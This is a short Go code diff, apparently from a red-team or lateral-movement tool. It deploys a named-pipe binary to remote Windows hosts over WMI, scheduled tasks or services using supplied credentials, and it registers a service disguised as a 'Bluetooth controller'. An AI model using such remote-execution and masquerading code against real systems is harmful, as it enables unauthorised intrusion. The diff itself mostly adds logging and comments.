@@ -75,6 +75,7 @@ func handlePipeSession(target, user, pass, domain, name, dropmethod string, runa
 	if dropmethod == "wmi" {
 		// Launch the named pipe binary using WMI
 		// We will use the same WMI code as before, but we will pass the pipe name as an argument
+		// Will always launch in the context of the executing user
 		cmd := fmt.Sprintf("cmd.exe /k %s -name %s", targetFile, name)
 		err := executeRemoteWMI(target, cmd, "C:\\Windows\\Temp", user, pass, domain)
 		if err != nil {
@@ -87,27 +88,30 @@ func handlePipeSession(target, user, pass, domain, name, dropmethod string, runa
 			fmt.Printf("Failed to create task: %v\n", err)
 			return
 		}
-		fmt.Printf("Successfully created task %s at %s \n", name, target)
+		log.Printf("Successfully created task %s at %s \n", name, target)
 		cmd := fmt.Sprintf("%s -name %s", targetFile, name)
 		err = runTask(target, name, user, pass, domain, cmd, runas, true)
 		if err != nil {
 			if err.Error() != "The service did not respond to the start or control request in a timely fashion." {
+				// This does not necessarily mean it didn't start
 				fmt.Println(err.Error())
 				return
 			}
 		}
 		// TODO - Check actual task status here
 	} else if dropmethod == "service" {
-		err := CreateRemoteService(target, name, name, "Bluetooth controller for XAIE", "cmd.exe /c cmd.exe", user, pass, domain)
+		err := CreateRemoteService(target, name, name, "Bluetooth controller for XAIE", "cmd.exe /c cmd.exe", user, pass, domain, runas)
 		if err != nil {
 			fmt.Printf("Failed to create service: %v\n", err)
 			return
 		}
-		fmt.Printf("Successfully created service %s at %s \n", name, target)
+		log.Printf("Successfully created service %s at %s \n", name, target)
 		cmd := fmt.Sprintf("%%COMSPEC%% /c %s -name %s", targetFile, name)
+		log.Printf("Starting service %s at %s \n", name, target)
 		err = executeRemoteService(target, cmd, user, pass, domain, name)
 		if err != nil {
 			if err.Error() != "The service did not respond to the start or control request in a timely fashion." {
+				// This does not necessarily mean it didn't start
 				fmt.Println(err.Error())
 			}
 		}
